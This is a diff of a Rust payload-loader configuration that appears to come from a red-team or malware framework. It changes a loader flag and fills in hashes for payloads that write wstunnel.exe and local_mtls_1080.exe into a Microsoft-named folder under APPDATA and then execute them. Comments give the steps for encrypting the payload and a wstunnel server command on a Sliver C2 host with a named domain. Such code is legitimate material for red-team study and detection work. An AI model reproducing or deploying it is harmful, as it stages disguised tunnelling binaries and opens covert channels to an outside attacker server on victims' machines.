@@ -176,7 +176,7 @@ exec(decoded_script)
         // cargo run --bin encrypt_payload ~/.malleable/payload/wstunnel.exe
         // cargo run --bin conf wstunnel --payload-dataop ~/.malleable/payload/wstunnel.exe.dataop
         // cp ~/.malleable/payload/wstunnel.exe.aead ../config/mem1
-        // winrust loader --mem1 --debug
+        // winrust loader --mem1 --mem2 --debug
         // root@sliver:~# ./wstunnel server --tls-certificate /etc/letsencrypt/live/sliverperso.kaboum.xyz/fullchain.pem --tls-private-key /etc/letsencrypt/live/sliverperso.kaboum.xyz/privkey.pem wss://[::]:8080
 
         info!("[+] Loader type choice: WriteFile Wstunnel from memory [AEAD]");
@@ -191,7 +191,7 @@ exec(decoded_script)
                 sleep: 0,
             }),
             path: String::from("${APPDATA}\\Microsoft\\wstunn3\\wstunnel.exe"),
-            hash:"".to_string(),
+            hash:"7fba14e73eab7f6595bc35e99c3fb0d5a04006bc20eee7a3389198bbd896cff42d006c3ecb952a78945da72f7d1d8942bd5314b00abe24fb38c3a9e03862b025".to_string(),
         }),
         Payload::Exec(Exec {
             path: String::from("${APPDATA}\\Microsoft\\wstunn3\\wstunnel.exe"),
@@ -205,7 +205,7 @@ exec(decoded_script)
             jitt:0,
             sleep:0        }),
             path: "${APPDATA}\\Microsoft\\wstunn3\\local_mtls_1080.exe".to_string(),
-            hash:"".to_string(),
+            hash:"925a219710f4f01044844817192c916aa8d0107cb940212336a33a37387ccdcda624164de1fed1f18ce21c1fc316ff5db5aa891d3b3b59d7b28b9a71ee12da3d".to_string(),
          }),
 
         /* 
